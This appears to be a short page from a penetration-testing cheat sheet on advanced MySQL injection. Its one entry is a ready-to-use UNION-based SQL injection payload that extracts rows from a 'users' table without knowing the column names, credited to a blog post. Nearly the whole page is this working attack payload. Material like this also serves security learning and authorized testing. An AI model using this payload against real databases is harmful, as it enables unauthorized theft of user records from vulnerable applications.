---
description: MySQL Injection Advanced Exploitation
---

# MySQL

#### MySQL extract table data without knowing column names:

{% code overflow="wrap" %}
```bash
#https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/
union select 1,(select `4` from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)-- - 
```
{% endcode %}